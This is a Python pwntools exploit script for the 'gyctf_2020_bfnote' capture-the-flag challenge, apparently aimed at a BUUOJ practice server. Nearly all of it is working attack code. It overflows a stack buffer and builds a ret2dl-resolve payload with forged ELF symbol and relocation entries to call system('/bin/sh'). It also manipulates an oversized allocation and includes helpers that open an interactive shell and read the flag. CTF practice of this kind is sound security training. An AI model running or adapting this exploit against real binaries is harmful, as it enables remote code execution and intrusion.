# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './gyctf_2020_bfnote'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27275'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    bss_start  = 0x804a060
    gap = 0x500
    stack_overflow = 'a' * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)

    sa( 'Give your description : ' , stack_overflow)

    fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + p32(0) + p32(0) + p32(0x12)
    fake_rel = p32(bss_start) + p32(0x7 + int((bss_start + gap + 0x4 * 4 + 0x8 + 0x8 + 0x8 - 0x080481D8) / 0x10) * 0x100)

    payload  = '\x00' * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) + p32(0) + p32(bss_start + gap + 0x4 * 4) + '/bin/sh\x00' + 'system\x00\x00' + fake_rel + fake_sym

    sa('Give your postscript : ',payload)
    sa('Give your notebook size : ',0x20000)
    sa('Give your title size : ', 0xf7d22714 - 0xf7d01008 - 16 )
    sa('please re-enter :\n' , 4)
    sa('title' , 'a')
    sa('note' , 'aaaa')





    
    ''

attack()
# p.success(getShell())
p.interactive()

'''
@File    :   gyctf_2020_bfnote.py
@Time    :   2021/10/29 00:06:30
@Author  :   Niyah 
'''